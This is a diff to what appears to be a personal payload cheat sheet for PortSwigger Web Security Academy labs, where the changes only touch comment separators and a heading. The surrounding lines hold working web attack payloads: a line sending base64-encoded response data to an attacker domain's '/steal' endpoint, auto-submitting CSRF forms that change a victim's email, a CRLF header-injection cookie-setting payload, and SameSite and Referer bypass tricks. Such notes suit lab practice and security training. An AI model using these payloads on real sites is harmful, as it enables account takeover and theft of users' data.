@@ -62,7 +62,6 @@ req2.open('GET', ourDomain + "/steal?data=" + btoa(response), false);
 req2.send();
 ```
 
-
 ```html
 
 // CSRF NO DEFENSES  / TRY WITH GET INSTEAD POST
@@ -73,7 +72,7 @@ req2.send();
 <script>
     document.forms[0].submit();
 </script>
-//
+
 // CSRF TOKEN NO TIED COOKIE SESSION
 <form class="login-form" name="change-email-form" action="<IP>/my-account/change-email" method="POST">
 	 <input type="hidden" type="email" name="email" value="foo@foo.com">    
@@ -83,7 +82,7 @@ req2.send();
 <script>
     document.forms[0].submit();
 </script>
-//
+
 // CSRF + Header injection - csrf token tied to csrfKey
 <form class="login-form" name="change-email-form" action="<IP>/my-account/change-email" method="POST">
 	 <input type="hidden" type="email" name="email" value="foo@foo.com">    
@@ -91,20 +90,20 @@ req2.send();
 </form>
 
 <img src="https://<IP>/?search=test%0d%0aSet-Cookie:%20csrfKey=<CSRF-KEY-MATCH>%3b%20SameSite=None" onerror="document.forms[0].submit()">
-//
+
 // SAME-SITE LAX (DEFAULT) + METHOD SPOOFING
 <script>
     document.location = "<IP>/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
 </script>
-//
-// SAMESITE STRICT BYPASS VIA CLIENT-SIDE REDIRECT
+
+// SAMESITE STRICT BYPASS VIA CLIENT-SIDE REDIRECT + PATH TRAVERSAL
 <script>
     location="<IP>/post/comment/confirmation?postId=../../my-account/change-email?email=pwnd@pwned.com%26submit=1"
 </script>
-//
+
 // CSRF where Referer validation depends on header being present (add this to normal csrf to remove Refered header)
 <meta name="referrer" content="no-referrer">
-//
+
 // CSRF with broken Referer validation
 Referrer-Policy: unsafe-url (http header)
 
